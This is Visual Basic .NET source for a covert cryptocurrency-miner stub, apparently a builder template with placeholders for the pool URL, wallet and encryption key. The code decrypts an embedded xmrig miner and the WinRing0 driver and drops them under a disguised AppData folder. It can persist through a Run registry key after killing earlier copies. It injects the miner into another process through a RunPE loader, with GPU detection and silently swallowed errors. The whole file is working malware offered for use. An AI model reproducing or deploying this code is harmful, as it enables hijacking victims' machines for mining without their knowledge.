Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False
#Const EnableCPU = False
#Const EnableGPU = False
#Const EnableIdle = False
#Const EnableNicehash = False
#Const EnableSSLTLS = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If

Public Class Program
    Public Shared Sub Main()
#If INS Then
                        Install()
#End If
        Initialize()
    End Sub

#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                Using Drop As New FileStream(PayloadPath, FileMode.Create)
                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                    Drop.Write(Client, 0, Client.Length)
                End Using
                Thread.Sleep(2 * 1000)
                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                Process.Start(PayloadPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "#InjectionDir\#InjectionTarget", arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Initialize()
        Try
            Dim xmr As Byte() = GetTheResource("#xmr")
            Dim xmrminer As Byte() = New Byte() {}
            Dim winring As Byte() = GetTheResource("#winring")
            Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
            Dim runString As String = ""

            Try
                System.IO.Directory.CreateDirectory(baseDir)
                My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)

                Using archive As ZipArchive = New ZipArchive(New MemoryStream(xmr))
                    For Each entry As ZipArchiveEntry In archive.Entries
                        If entry.FullName.Contains("xmrig.exe") Then
                            Using streamdata As Stream = entry.Open()
                                Using ms = New MemoryStream()
                                    streamdata.CopyTo(ms)
                                    xmrminer = ms.ToArray
                                End Using
                            End Using
                        End If
                    Next
                End Using

#If EnableGPU Then
            Dim GPUstr as String = GetGPU
            If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                Try
                    Dim libs As Byte() = GetTheResource("#libs")
                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
                        For Each entry As ZipArchiveEntry In archive.Entries
                            entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
                        Next
                    End Using

                    If GPUstr.ToLower.Contains("nvidia") Then
                        runString += " --cuda --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote
                    End If

                    If GPUstr.ToLower.Contains("amd") Then
                        runString += " --opencl "
                    End If

                Catch ex As Exception
                End Try
            End If
#End If
            Catch ex As Exception
            End Try

#If EnableIdle Then
            runString += " --donate-level=5 "
#Else
            runString += " --donate-level=4 "
#End If

#If EnableNicehash Then
            runString += " --nicehash "
#End If

#If EnableCPU = False Then
            runString += " --no-cpu "
#End If

#If EnableSSLTLS Then
            runString += " --tls "
#End If

            'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
            Dim argstr As String = " -B #AdvancedParams --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU "
            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
            Run(GetTheResource("#dll"), argstr + runString, xmrminer)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function GetGPU() As String
        Try
            Dim VideoCard As String = ""
            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If
            Return ""
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes("#KEY"))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
